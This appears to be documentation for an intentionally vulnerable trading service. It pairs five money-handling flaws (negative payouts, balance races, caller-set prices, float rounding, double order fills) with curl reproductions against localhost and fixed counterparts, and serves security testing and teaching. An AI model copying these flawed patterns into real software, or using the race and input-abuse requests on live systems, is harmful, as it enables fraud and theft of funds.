# Business-logic flaws in `trading` (LOGIC-001 to LOGIC-005)

**Family:** `LOGIC` · **Service:** `trading` · **Scanner:** SAST · **OWASP:** A04 · API6

Five flaws in the rules that move money: an amount nobody bounds (LOGIC-001), a
balance read and then written (LOGIC-002), a price the caller names
(LOGIC-003), money in a float (LOGIC-004), and a fill that is two writes
instead of one transaction (LOGIC-005).

Every reproduction below was run on 2026-11-27 against the service alone, on
`127.0.0.1:4202`, through the HTTP/1.1 relay on `127.0.0.1:4212`. `$A` is
Alice's token, `$E` Erin's, `$AD` the administrator's. The store was reset to
the fake data between reproductions. Erin starts with 500.00 dollars.

## LOGIC-001 — `payout`: a negative amount credits the wallet

The line (`apps/trading/src/wallets/payout.resolver.ts`):

```ts
// LOGIC-001 / CWE-20: the amount is taken exactly as it came; a negative payout is a deposit
@Args('amount', { type: () => DecimalScalar }) amount: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log001.json
# {"amount": "-500.00"}
{"data":{"payout":[...,{"asset":"USD","balance":"10500.00"},...]}}
```

Alice withdrew minus five hundred dollars and gained five hundred: 10000.00
became 10500.00.

**Counterpart 1 — `withdraw(amount)`.** The amount is checked before any
balance changes: `BAD_USER_INPUT`, `"The smallest withdrawal is 0.01 (@Min(0.01)
on the amount)"`.

**Counterpart 2 — `POST /internal/wallets/withdraw`.** The identical body:
HTTP `400`, `"amount must be above zero"` — the route's schema refuses an amount
at or below zero (an exclusive minimum of nothing).

## LOGIC-002 — `payout`: the balance is read, then written

The line (`apps/trading/src/wallets/payout.resolver.ts`):

```ts
// LOGIC-002 / CWE-367: the balance is read here and written below; between the two, any number of other payouts run
const wallet = await this.dataSource.getRepository(WalletEntity).findOneBy({ userId: caller, asset: 'USD' });
```

Ten parallel payouts of 500.00 out of Erin's 500.00 (`xargs -P 10`, the payload
of LOGIC-001 with a positive amount):

```console
$ seq 10 | xargs -P 10 -I{} curl -s $URL/graphql -H 'content-type: application/json' \
    -H "authorization: Bearer $E" -d @log002.json -o /dev/null -w "%{http_code} "
200 200 200 200 200 200 200 200 200 200
$ # Erin's ledger afterwards:
withdrawals: 10, sum: -5000.00    her USD balance: -2500.00
```

All ten were answered. Five thousand dollars were paid out of a balance of five
hundred, and the balance ended below zero.

**Counterpart 1 — `withdraw`, ten parallel.** One conditional
`UPDATE … WHERE balance + ? >= 0`, the affected rows checked:

```console
answered: 1   refused: 9   codes: {'CONFLICT': 9}
withdrawals: 1    her USD balance: 0.00
```

**Counterpart 2 — `POST /internal/wallets/withdraw`, ten parallel.** One
transaction with `SELECT … FOR UPDATE`:

```console
200 400 400 400 400 400 400 400 400 400
```

One answered, nine refused (`"The USD balance is below 500.00"`), one ledger
entry, balance 0.00.

## LOGIC-003 — `quickBuy`: the caller's price is the price

The line (`apps/trading/src/orders/quick-buy.resolver.ts`):

```ts
// LOGIC-003 / CWE-840: the caller's price is the price; a fraction of a coin at a fraction of a cent rounds to nothing
@Args('price', { type: () => DecimalScalar }) price: string,
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log003.json
# {"symbol": "BTC-USD", "quantity": "0.00010000", "price": "0.01"}
{"data":{"quickBuy":{"status":"FILLED","limitPrice":"0.01","quantity":"0.00010000"}}}
```

A ten-thousandth of a bitcoin at a hundredth of a cent costs 0.0001 cents,
which rounds to zero: the coin was bought for 0.00 dollars, and Alice's USD
balance did not move.

**Counterpart 1 — `placeOrder(input: PlaceOrderInput!)`.** There is no price
field to send: the schema refuses the payload with the same body,
`"Field \"price\" is not defined by type \"PlaceOrderInput\""`, `BAD_USER_INPUT`.

**Counterpart 2 — `buyAtMarket(symbol, quantity)`.** The price is computed on
the server from the reference price, with a maximum slippage of two percent.
The same quantity costs 6.50:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" -d @log003c2.json
{"data":{"buyAtMarket":{"status":"FILLED","limitPrice":"65000.00"}}}
$ # Alice's wallets afterwards:
[{'asset': 'BTC', 'balance': '0.00010000'}, ..., {'asset': 'USD', 'balance': '9993.50'}, ...]
```

## LOGIC-004 — `convert`: money in a float

The line (`apps/trading/src/money/convert.resolver.ts`):

```ts
// LOGIC-004 / CWE-682: binary floating point on money: 8.2 dollars is 819.9999… cents when multiplied as a float
const minor = Math.floor(amount * 10 ** scaleOf(asset));
```

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"query($asset: Asset!, $amount: Float!) { convert(asset: $asset, amount: $amount) }",
         "variables":{"asset":"USD","amount":8.2}}'
{"data":{"convert":"8.19"}}
```

Eight dollars twenty became eight nineteen: a minor unit was lost to the
binary representation of 8.2, and whoever holds the difference gained it.

**Counterpart 1 — `placeOrder`.** Money is a decimal string on the wire and
integer minor units in the store; no float ever holds it. A quantity of `8.2`
comes back `8.20000000` (820000000 minor units).

**Counterpart 2 — `convertExact(asset, amount)`.** A decimal library with the
rounding mode named (half up, at the asset's scale):

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $A" \
    -d '{"query":"mutation($asset: Asset!, $amount: Decimal!) { convertExact(asset: $asset, amount: $amount) }",
         "variables":{"asset":"USD","amount":"8.2"}}'
{"data":{"convertExact":"8.20"}}
```

## LOGIC-005 — `matchOrder`: an order filled twice

The line (`apps/trading/src/orders/match-order.resolver.ts`):

```ts
// LOGIC-005 / CWE-362: the credit and the fill are two writes in no transaction; two callers both see the order OPEN
if (order.side === OrderSide.BUY) {
  await this.wallets.adjust(...);
```

Two parallel calls on order 1, Alice's resting buy of 0.5 BTC:

```console
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005.json &
$ curl -s $URL/graphql -H 'content-type: application/json' -H "authorization: Bearer $AD" -d @log005.json &
{"data":{"matchOrder":{"id":"1","status":"FILLED"}}}
{"data":{"matchOrder":{"id":"1","status":"FILLED"}}}
$ # Alice's wallet afterwards:
[{'asset': 'BTC', 'balance': '1.00000000'}]
```

Both callers saw the order OPEN: twice 0.5 was credited, 1.00000000 BTC in all,
and two trades were written for one order.

**Counterpart 1 — `tickPrices`, twice in parallel.** One transaction, row locks
on the crossed orders, a conditional update on the status:

```console
$ # after two parallel ticks:
tick1 BTC: [{'symbol': 'BTC-USD', 'referencePrice': '63700.00'}]   # the first step is minus two percent
{"data":{"orderDetails":{"id":"1","status":"FILLED"}}}              # filled once
alice BTC: [{'asset': 'BTC', 'balance': '0.50000000'}]              # credited once
```

**Counterpart 2 — `settleOrder(orderId, tickId)`, the same tick twice.** The
unique key on (`orderId`, `tickId`) refuses the repeat:

```console
$ curl -s ... -d @log005c2.json   # {"orderId": "1", "tickId": "tick-scenario-5"}
{"data":{"settleOrder":{"id":"1","status":"FILLED"}}}
$ curl -s ... -d @log005c2.json   # the same tick again
{"data":{"settleOrder":{"id":"1","status":"FILLED"}}}
$ # Alice's wallet afterwards:
[{'asset': 'BTC', 'balance': '0.50000000'}]                          # credited once
```

## The tests

`apps/trading/test/scenarios/logic.int-spec.ts` — one `describe` per scenario,
one payload per `describe`, sent as written to the vulnerable operation and to
each protected counterpart. The two races fire their requests with `Promise.all`
and assert the end state. The Postman collection `postman/trading/` carries one
request per scenario in its `LOGIC` folder.

## Scope of the counterparts

Each counterpart claim is scoped: this operation, receiving this payload, keeps
the money whole for that reason. Nothing here says any operation is secure in
general.
